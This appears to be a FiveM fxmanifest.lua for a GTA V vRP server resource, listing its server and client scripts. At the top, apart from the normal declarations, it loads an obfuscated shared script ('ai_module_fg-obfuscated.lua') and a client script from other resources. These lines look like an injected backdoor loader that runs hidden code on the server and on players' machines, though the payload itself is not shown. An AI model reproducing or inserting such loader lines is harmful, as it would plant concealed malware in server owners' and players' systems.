shared_script '@tables/ai_module_fg-obfuscated.lua'
--



  client_script "@vrp_tables/client.lua" 
fx_version "bodacious"
game "gta5"

server_script  {
	"@vrp/lib/utils.lua",
	"server.lua"
}  
client_scripts {
	"@vrp/lib/utils.lua",
	"client-side/*"
}                                                                                                                